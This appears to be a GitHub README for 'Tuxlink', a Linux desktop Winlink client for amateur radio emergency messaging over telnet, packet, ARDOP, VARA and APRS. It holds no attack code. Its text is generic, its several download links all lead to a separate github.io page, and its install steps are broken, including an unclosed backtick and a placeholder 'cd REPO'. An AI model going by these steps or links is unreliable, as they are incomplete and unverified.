# Tuxlink v2026 - Linux desktop Winlink client

> **Tuxlink is a native Linux desktop Winlink client for amateur radio emergency communications, built around a Rust and Tauri B2F engine and designed for packet, HF, and APRS workflows in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucasfoster1994/tuxlink-linux-radio-hub?style=flat-square)](https://github.com/lucasfoster1994/tuxlink-linux-radio-hub)

---

<p align="center">
  <a href="https://lucasfoster1994.github.io/tuxlink-linux-radio-hub/">
    <img src="https://img.shields.io/badge/Download-Tuxlink%20Latest-brightgreen?style=for-the-badge" alt="Download Tuxlink">
  </a>
</p>

> **[Download Latest Build](https://lucasfoster1994.github.io/tuxlink-linux-radio-hub/)**
>
> **[Direct Download - Tuxlink v2026](https://lucasfoster1994.github.io/tuxlink-linux-radio-hub/)**

---

## Overview

Tuxlink is a desktop application for Linux operators who need Winlink-style messaging and radio-connected communication tools. It is built as a native Linux app, so it runs in a standard workstation setup without depending on WINE, and it targets amateur radio, ham radio, and emergency communications use cases.

The project combines messaging features with several radio transport paths in a single interface. Support for telnet-based CMS access, AX.25 packet radio, ARDOP, VARA, and APRS-oriented tools makes it useful for station operations, field deployment, and everyday message handling.

---

## Capabilities

- Native Linux desktop GUI
- Rust-based B2F protocol engine
- CMS access over telnet
- AX.25 packet radio support
- ARDOP HF support
- VARA HF and FM support
- APRS tactical chat tools
- Mailbox, compose, address book, and search workflow
- Offline map and request workflow support
- Benshi UV-Pro Bluetooth control integration

---

## Installation

Get the latest build from the project release page, or compile it from source if you want to run it locally.

Clone the repository:
- `git clone https://github.com/lucasfoster1994/tuxlink-linux-radio-hub.git
- `cd REPO`

After that, continue with the build or launch steps appropriate for your Linux desktop environment. If you install a packaged release, start the app once it has been extracted or installed according to the bundle format.

---

## How to Use

Tuxlink is intended to support radio messaging work from a Linux desktop. A typical session can involve checking the mailbox, drafting or searching for a message, and choosing the connection method that matches your station layout.

Common workflow examples:
- Open the app and review the mailbox
- Compose a message and prepare addressing details
- Use telnet CMS access when that is the preferred route
- Switch to packet, ARDOP, or VARA transport for radio-linked delivery
- Use APRS or offline request tools when working in tactical or field conditions
- Review searches and stored contacts through the built-in address book

If you use hardware such as Benshi UV-Pro, connect it according to your station setup before beginning a session.

---

## Configuration

Tuxlink settings are managed inside the application, along with the radio services or devices you attach to it.

Typical configuration areas include:
- CMS connection details
- Packet or HF modem settings
- APRS and tactical chat preferences
- Address book entries
- Offline map and request options
- Bluetooth device pairing for supported hardware

If a setting does not appear in the main interface, check the app preferences or the companion configuration for your radio hardware.

---

## Requirements

- Linux desktop environment
- A system capable of running a Tauri-based desktop application
- Rust toolchain if you are building from source
- Network access for telnet-based CMS workflows
- Compatible radio hardware or modem support for AX.25, ARDOP, or VARA use cases when needed
- Optional Bluetooth support for compatible device control features

---

## FAQ

### Is this intended for a particular operating system?
Tuxlink is a Linux desktop client.

### Does it handle more than one transport type?
Yes. The project profile includes telnet CMS access, AX.25 packet support, ARDOP, VARA, and APRS-related workflows.

### Can I run it without radio hardware?
Some functions depend on network access or radio equipment, while other parts of the workflow can still help with planning, messaging, and configuration.

### How do I get updates?
Use the download link above or check the repository for the latest build and release notes.

### What should I do if something is not working?
Confirm your Linux environment, verify any connected modem or radio settings, and review the app configuration for the transport method you are using.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
